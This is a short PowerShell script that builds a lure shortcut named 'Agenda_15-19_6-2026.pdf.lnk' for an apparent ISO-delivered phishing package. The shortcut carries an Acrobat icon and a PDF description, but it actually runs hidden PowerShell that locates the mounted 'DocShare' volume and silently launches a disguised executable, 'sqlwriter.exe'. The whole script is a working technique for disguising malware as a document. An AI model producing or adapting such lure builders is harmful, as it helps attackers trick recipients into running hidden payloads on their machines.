$IsoRoot = "C:\tmp\SHARE_1\DocShare"
$VolumeName = "DocShare"
$LnkPath = Join-Path $IsoRoot "Agenda_15-19_6-2026.pdf.lnk"

$psCmd = '$d=(Get-CimInstance Win32_LogicalDisk|Where-Object {$_.VolumeName -eq ''' + $VolumeName + '''}|Select-Object -First 1).DeviceID;if($d){Start-Process -FilePath ($d+''\Microsoft\sqlwriter.exe'') -WindowStyle Hidden}'

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($LnkPath)

$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -Command `"$psCmd`""
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = "$env:ProgramFiles\Adobe\Acrobat DC\Acrobat\Acrobat.exe,-2"
$Shortcut.Description = "Agenda_15-19_6-2026.pdf"
$Shortcut.Save()

Write-Host "[+] Created: $LnkPath"
